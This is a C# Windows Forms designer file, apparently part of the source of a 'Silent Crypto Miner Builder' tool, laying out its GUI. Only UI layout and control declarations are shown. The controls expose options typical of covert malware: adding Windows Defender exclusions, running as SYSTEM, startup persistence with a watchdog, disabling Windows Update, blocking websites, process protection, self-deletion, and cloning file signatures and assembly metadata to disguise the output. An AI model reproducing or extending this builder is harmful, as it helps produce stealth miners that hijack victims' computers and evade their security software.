            // toggleAdministrator
            // 
            this.toggleAdministrator.BackColor = System.Drawing.Color.Transparent;
            this.toggleAdministrator.Checked = false;
            this.toggleAdministrator.ForeColor = System.Drawing.Color.Black;
            this.toggleAdministrator.Location = new System.Drawing.Point(169, 7);
            this.toggleAdministrator.Margin = new System.Windows.Forms.Padding(2);
            this.toggleAdministrator.Name = "toggleAdministrator";
            this.toggleAdministrator.Size = new System.Drawing.Size(50, 24);
            this.toggleAdministrator.TabIndex = 98;
            this.toggleAdministrator.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.toggleAdministrator_CheckedChanged);
            // 
            // picAdmin1
            // 
            this.picAdmin1.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin1.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.picAdmin1.Location = new System.Drawing.Point(224, 37);
            this.picAdmin1.Name = "picAdmin1";
            this.picAdmin1.Size = new System.Drawing.Size(20, 20);
            this.picAdmin1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin1.TabIndex = 97;
            this.picAdmin1.TabStop = false;
            // 
            // labelOptionWD
            // 
            this.labelOptionWD.AutoEllipsis = true;
            this.labelOptionWD.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionWD.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionWD.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionWD.Location = new System.Drawing.Point(9, 37);
            this.labelOptionWD.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionWD.Name = "labelOptionWD";
            this.labelOptionWD.Size = new System.Drawing.Size(158, 17);
            this.labelOptionWD.TabIndex = 92;
            this.labelOptionWD.Text = "Add Defender Exclusions:";
            // 
            // toggleWDExclusions
            // 
            this.toggleWDExclusions.BackColor = System.Drawing.Color.Transparent;
            this.toggleWDExclusions.Checked = false;
            this.toggleWDExclusions.ForeColor = System.Drawing.Color.Black;
            this.toggleWDExclusions.Location = new System.Drawing.Point(169, 34);
            this.toggleWDExclusions.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWDExclusions.Name = "toggleWDExclusions";
            this.toggleWDExclusions.Size = new System.Drawing.Size(50, 24);
            this.toggleWDExclusions.TabIndex = 91;
            // 
            // tabBuild
            // 
            this.tabBuild.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabBuild.Controls.Add(this.labelSeconds);
            this.tabBuild.Controls.Add(this.labelStartDelay);
            this.tabBuild.Controls.Add(this.txtStartDelay);
            this.tabBuild.Controls.Add(this.labelGitHub);
            this.tabBuild.Controls.Add(this.txtLog);
            this.tabBuild.Controls.Add(this.btnBuild);
            this.tabBuild.Location = new System.Drawing.Point(89, 4);
            this.tabBuild.Margin = new System.Windows.Forms.Padding(0);
            this.tabBuild.Name = "tabBuild";
            this.tabBuild.Size = new System.Drawing.Size(418, 189);
            this.tabBuild.TabIndex = 4;
            this.tabBuild.Text = "Build";
            // 
            // labelSeconds
            // 
            this.labelSeconds.AutoSize = true;
            this.labelSeconds.BackColor = System.Drawing.Color.Transparent;
            this.labelSeconds.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelSeconds.Location = new System.Drawing.Point(121, 11);
            this.labelSeconds.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelSeconds.Name = "labelSeconds";
            this.labelSeconds.Size = new System.Drawing.Size(57, 17);
            this.labelSeconds.TabIndex = 57;
            this.labelSeconds.Text = "Seconds";
            // 
            // labelStartDelay
            // 
            this.labelStartDelay.AutoEllipsis = true;
            this.labelStartDelay.BackColor = System.Drawing.Color.Transparent;
            this.labelStartDelay.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartDelay.Location = new System.Drawing.Point(10, 11);
            this.labelStartDelay.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartDelay.Name = "labelStartDelay";
            this.labelStartDelay.Size = new System.Drawing.Size(74, 17);
            this.labelStartDelay.TabIndex = 56;
            this.labelStartDelay.Text = "Start Delay:";
            // 
            // txtStartDelay
            // 
            this.txtStartDelay.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStartDelay.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtStartDelay.ForeColor = System.Drawing.Color.Silver;
            this.txtStartDelay.Location = new System.Drawing.Point(85, 9);
            this.txtStartDelay.MaxLength = 32767;
            this.txtStartDelay.MultiLine = false;
            this.txtStartDelay.Name = "txtStartDelay";
            this.txtStartDelay.ReadOnly = false;
            this.txtStartDelay.Size = new System.Drawing.Size(34, 24);
            this.txtStartDelay.TabIndex = 55;
            this.txtStartDelay.Text = "15";
            this.txtStartDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartDelay.UseSystemPasswordChar = false;
            this.txtStartDelay.WordWrap = false;
            // 
            // labelGitHub
            // 
            this.labelGitHub.AutoSize = true;
            this.labelGitHub.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelGitHub.Location = new System.Drawing.Point(8, 167);
            this.labelGitHub.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelGitHub.Name = "labelGitHub";
            this.labelGitHub.Size = new System.Drawing.Size(48, 17);
            this.labelGitHub.TabIndex = 21;
            this.labelGitHub.TabStop = true;
            this.labelGitHub.Text = "GitHub";
            this.labelGitHub.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelGitHub_LinkClicked);
            // 
            // txtLog
            // 
            this.txtLog.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtLog.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtLog.ForeColor = System.Drawing.Color.Silver;
            this.txtLog.Location = new System.Drawing.Point(10, 41);
            this.txtLog.Margin = new System.Windows.Forms.Padding(2);
            this.txtLog.MaxLength = 32767;
            this.txtLog.MultiLine = true;
            this.txtLog.Name = "txtLog";
            this.txtLog.ReadOnly = true;
            this.txtLog.Size = new System.Drawing.Size(399, 119);
            this.txtLog.TabIndex = 18;
            this.txtLog.Text = "Output...";
            this.txtLog.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtLog.UseSystemPasswordChar = false;
            this.txtLog.WordWrap = false;
            // 
            // btnBuild
            // 
            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
            this.btnBuild.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnBuild.Location = new System.Drawing.Point(309, 9);
            this.btnBuild.Margin = new System.Windows.Forms.Padding(2);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(99, 25);
            this.btnBuild.TabIndex = 17;
            this.btnBuild.Text = "Build";
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // Builder
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formBuilder);
            this.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "Builder";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formBuilder.ResumeLayout(false);
            this.tabcontrolBuilder.ResumeLayout(false);
            this.tabMain.ResumeLayout(false);
            this.tabMain.PerformLayout();
            this.tabStartup.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin4)).EndInit();
            this.tabAssembly.ResumeLayout(false);
            this.tabIcon.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.picIcon)).EndInit();
            this.tabSignature.ResumeLayout(false);
            this.tabOptions.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin1)).EndInit();
            this.tabBuild.ResumeLayout(false);
            this.tabBuild.PerformLayout();
            this.ResumeLayout(false);

        }

        internal MephTheme formBuilder;
        internal System.ComponentModel.BackgroundWorker workerBuild;
        internal MephButton btnAssemblyRandom;
        internal MephButton btnAssemblyClone;
        internal MephTextBox txtAssemblyVersion4;
        internal MephTextBox txtAssemblyVersion3;
        internal MephTextBox txtAssemblyVersion2;
        internal MephTextBox txtAssemblyVersion1;
        internal MephTextBox txtAssemblyTrademark;
        internal MephTextBox txtAssemblyCompany;
        internal MephTextBox txtAssemblyCopyright;
        internal MephTextBox txtAssemblyDescription;
        internal MephTextBox txtAssemblyProduct;
        internal MephTextBox txtAssemblyTitle;
        internal MephTextBox txtIconPath;
        internal MephButton btnIconBrowse;
        internal MephTextBox txtStartupEntryName;
        internal Label labelStartupEntryName;
        internal PictureBox picIcon;
        internal Label labelStartupSavePath;
        internal MephComboBox txtStartupPath;
        internal MephCheckBox chkAssembly;
        internal MephCheckBox chkIcon;
        internal MephCheckBox chkStartup;
        internal MephTabcontrol tabcontrolBuilder;
        internal TabPage tabMain;
        internal TabPage tabStartup;
        internal TabPage tabAssembly;
        internal TabPage tabIcon;
        internal TabPage tabBuild;
        internal MephTextBox txtLog;
        internal MephButton btnBuild;
        internal Label labelAssemblyVersion;
        internal LinkLabel labelGitHub;
        internal Label labelSeconds;
        internal Label labelStartDelay;
        internal MephTextBox txtStartDelay;
        internal Label labelStartupWatchdog;
        internal MephToggleSwitch toggleWatchdog;
        internal Label labelHelp;
        internal LinkLabel labelWiki;
        internal MephButton btnMinerRemove;
        internal MephButton btnMinerEdit;
        internal MephButton btnMinerAdd;
        internal Label labelMiners;
        internal TabPage tabOptions;
        internal Label labelOptionAdministrator;
        internal MephToggleSwitch toggleAdministrator;
        internal PictureBox picAdmin1;
        internal Label labelOptionWD;
        internal MephToggleSwitch toggleWDExclusions;
        internal MephButton btnLoadState;
        internal MephButton btnSaveState;
        internal Label labelLang;
        internal MephComboBox comboLanguage;
        internal Label labelDisableSleep;
        internal MephToggleSwitch toggleDisableSleep;
        internal MephCheckBox chkBlockWebsites;
        internal MephTextBox txtBlockWebsites;
        internal Label labelStartupAutoDelete;
        internal MephToggleSwitch toggleAutoDelete;
        internal PictureBox picAdmin3;
        internal MephTextBox txtStartupFileName;
        internal Label labelStartupFileName;
        internal PictureBox picAdmin4;
        internal Label labelStartupRunSystem;
        internal MephToggleSwitch toggleRunSystem;
        internal PictureBox picAdmin2;
        internal Label labelOptionWindowsUpdate;
        internal MephToggleSwitch toggleWindowsUpdate;
        internal MephButton btnAdvancedOptions;
        internal MephListBox listMiners;
        internal PictureBox picAdmin5;
        internal Label labelOptionProcessProtect;
        internal MephToggleSwitch toggleProcessProtect;
        internal TabPage tabSignature;
        internal MephTextBox txtSignatureData;
        internal MephButton btnSignatureClone;
        internal MephButton btnSignatureBrowse;
        internal MephTextBox txtSignaturePath;
        internal MephCheckBox chkSignature;
        internal Label labelSignatureData;
    }
}